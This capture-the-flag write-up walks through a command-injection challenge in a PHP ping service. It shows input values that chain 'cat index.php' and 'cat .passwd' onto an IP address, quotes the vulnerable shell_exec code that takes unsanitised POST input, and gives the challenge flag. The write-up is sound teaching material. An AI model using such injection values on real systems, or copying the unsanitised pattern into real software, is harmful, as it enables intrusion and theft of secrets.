---
custom_edit_url: null
sidebar_position: 6
---

> Find a vulnerability in this service and exploit it.
> The flag is on the `index.php` file.

![1](https://github.com/Knign/Write-ups/assets/110326359/c39a2154-0f61-483b-b922-b8067f6c8c5b)

Let's input `127.0.0.1` as the input field is suggesting.

![2](https://github.com/Knign/Write-ups/assets/110326359/7bdbfb6d-5555-416b-8fcc-128d84d901c5)

We can see that our input is used to execute a `ping` command.

We know the flag is on the `index.php` file. In order to `cat` the flag we need to use the `;` separator.
## User Input
```
127.0.0.1 ; cat index.php
```

![3](https://github.com/Knign/Write-ups/assets/110326359/f0d75377-bb63-4cc1-9309-34b6daefa1f6)

Looks like our input was processed properly. Let's check the source code.

![4](https://github.com/Knign/Write-ups/assets/110326359/22cb3fb7-b0bb-4d42-b737-580593a2a05f)

The source code reveals an interesting piece of code.
## PHP code
```php
<?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
```
The line `shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'")` executes a shell command based on user input ($_POST["ip"]).

The line `"".file_get_contents(".passwd").""` reads the content of a file named `.passwd` and appends it to the `$flag` variable. 

Let's modify our input to `cat` the `.passwd` file.
## User Input
```
127.0.0.1 ; cat .passwd
```

![5](https://github.com/Knign/Write-ups/assets/110326359/1c040311-cc40-487b-b866-67abe9edd2ff)

## Flag
```
S3rv1ceP1n9Sup3rS3cure
```
